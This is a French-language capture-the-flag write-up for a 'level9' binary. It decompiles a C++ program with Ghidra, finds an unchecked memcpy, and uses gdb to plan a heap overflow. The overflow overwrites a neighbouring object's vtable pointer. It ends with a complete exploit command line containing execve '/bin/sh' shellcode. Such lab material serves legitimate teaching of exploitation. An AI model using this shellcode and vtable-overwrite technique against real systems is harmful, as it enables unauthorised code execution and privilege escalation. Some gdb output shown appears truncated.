@@ -1,0 +1,154 @@
+On decompile avec ghidra et on trouve un code en cpp:
+
+
+void main(int param_1,int param_2)
+
+{
+  N *this;
+  N *this_00;
+  
+  if (param_1 < 2) {
+                    /* WARNING: Subroutine does not return */
+    _exit(1);
+  }
+  this = (N *)operator.new(0x6c);
+  N::N(this,5);
+  this_00 = (N *)operator.new(0x6c);
+  N::N(this_00,6);
+  N::setAnnotation(this,*(char **)(param_2 + 4));
+  (*(code *)**(undefined4 **)this_00)(this_00,this);
+  return;
+}
+
+
+/* N::N(int) */
+
+void __thiscall N::N(N *this,int param_1)
+
+{
+  *(undefined ***)this = &PTR_operator+_08048848;
+  *(int *)(this + 0x68) = param_1;
+  return;
+}
+
+
+/* N::setAnnotation(char*) */
+
+void __thiscall N::setAnnotation(N *this,char *param_1)
+
+{
+  size_t __n;
+  
+  __n = strlen(param_1);
+  memcpy(this + 4,param_1,__n);
+  return;
+}
+
+/* N::TEMPNAMEPLACEHOLDERVALUE(N&) */
+
+int __thiscall N::operator+(N *this,N *param_1)
+
+{
+  return *(int *)(param_1 + 0x68) + *(int *)(this + 0x68);
+}
+
+
+/* N::TEMPNAMEPLACEHOLDERVALUE(N&) */
+
+int __thiscall N::operator-(N *this,N *param_1)
+
+{
+  return *(int *)(this + 0x68) - *(int *)(param_1 + 0x68);
+}
+
+
+Ce qui donne en langage un peu plus comprehensible:
+
+class N {
+private:
+    void **vtable;        // À l'adresse +0x0 
+    char annotation[100]; // À l'adresse +0x4 (buffer de données)
+    int value;           // À l'adresse +0x68 (104 en décimal)
+    
+public:
+    N(int val);
+    void setAnnotation(char *str);
+    int operator+(N &other);
+    int operator-(N &other);
+};
+
+void main(int argc, char **argv) {
+    if (argc < 2) {
+        exit(1);
+    }
+    
+    N *obj1 = new N(5);
+    N *obj2 = new N(6);
+    
+    obj1->setAnnotation(argv[1]); // Copie argv[1] dans obj1
+    
+    // Appel d'une fonction virtuelle via obj2 avec obj1 en paramètre
+    (*(obj2->vtable[0]))(obj2, obj1);
+}
+
+void N::setAnnotation(char *param_1) {
+    size_t len = strlen(param_1);
+    memcpy(this + 4, param_1, len);  // ← DANGER ! Pas de vérification de taille
+}
+
+On a donc dans la methode setAnnotation un memcpy sans verification de taille, ce qui nous permet de deborder et d'ecrire dans la memoir.
+Et juste apres on a un appel a une fonction virtuelle. On peut corrompre l'adresse de la fonction virtuelle dans la vtable pour executer du shell code a la place d'executer la fonction déffinie dans la classe mere.
+
+On va commencer par chercher l'adresse this (la classe N) juste apres le malloc (l'appel a new) pour avoir son adresse dans la memoire.
+
+gdb ./level9
+(gdb) b *0x0804861c
+(gdb) run AAAA
+(gdb) i registers
+eax            eax            0x804a008	134520840
+	134520840
+
+Donc on sait maintenant que la classe N a été enregistrée a l'adresse 0x804a008
+
+On va donc voir a partir d'ou sont stockées les données passées en param:
+
+gdb ./level9
+run AAAA # (A = x041 en hexa donc on cherche les 41)
+(gdb) x/10x 0x804a008
+0x804a008:	0x08048848	0x804a010	 
+0x804a028:	0x00000000	0x00000000
+
+donc on commence a ecrire 4 bit apres 0x804a008:
+0x804a008 + 4 = 0x804a00c -> 0x804a010
+
+on rappel la structure de l'objet N
+
+class N {
+private:
+    void **vtable; 4 bytes
+    char annotation[100]; 100 bytes
+    int value; 4 bytes
+    ...
+}
+
+et dans le main on avait:
+    N *obj1 = new N(5);
+    N *obj2 = new N(6);
+
+Donc obj2 se trouve en memoir juste apres obj1.
+
+Ce qu'on va faire c'est ecraser l'adresse de la vtable de obj2 par du shell code que l'on place dans la variable annotation de obj1.
+
+pour ca on donne a 0x804a00c l'adresse de l'octet d'apres qui est : 0x804a00c + 4 = 0x804a010 et on donnera comme pointeur a vtable de obj2 0x804a00c pour qu'il execute le code contenue dans la string annotation
+
+donc on se retrouve avec ce payload
+
+0x804a010 + shellcode + padding + 0x804a00c
+
+la taille de 0x804a010 + shellcode + padding doit faire 108 de long pour que 0x804a00c ecrase l'adresse de vtable de obj2
+donc on fait : 108 - 4 (0x804a010) - 21 (taille du shell code) = 83
+
+on obtient au final ce payload:
+
+./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 83 + "\x0c\xa0\x04\x08"')
+
